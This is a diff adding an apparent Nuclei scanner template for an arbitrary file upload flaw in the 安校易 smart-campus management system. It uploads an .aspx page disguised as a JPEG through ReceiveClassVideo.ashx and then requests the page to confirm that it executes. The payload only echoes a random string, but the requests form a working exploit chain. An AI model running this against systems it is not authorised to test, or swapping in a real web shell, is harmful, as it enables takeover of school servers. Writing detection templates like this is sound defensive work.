@@ -1,0 +1,47 @@
+id: poc-yaml-wincard-receiveclassvideo-upload
+info:
+  name: 智慧校园(安校易)管理系统ReceiveClassVideo任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    This template checks for an arbitrary file upload vulnerability in the 智慧校园(安校易)管理系统 management system, specifically targeting the ReceiveClassVideo handler.
+variables:
+  str1: "{{to_lower(rand_base(10))}}"
+  t1: "{{rand_int(100, 1000)}}"
+http:
+  - raw:
+      - |
+        POST /Tool/ReceiveClassVideo.ashx?file_tmid={{t1}}&orgid=1&classID=1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----dqdaieopnozbkapjacdbdthlvtlyl
+        X-Requested-With: XMLHttpRequest
+
+        ------dqdaieopnozbkapjacdbdthlvtlyl
+        Content-Disposition: form-data; name="File1"; filename="1.aspx"
+        Content-Type: image/jpeg
+
+        <%@ Page Language="Jscript" validateRequest="false" %>
+        <%Response.Write("{{str1}}");%>
+        ------dqdaieopnozbkapjacdbdthlvtlyl--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "保存班级视频"
+          - "rst:false"
+  - raw:
+      - |
+        GET /Upload/AD_Info/1/{{t1}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{str1}}"
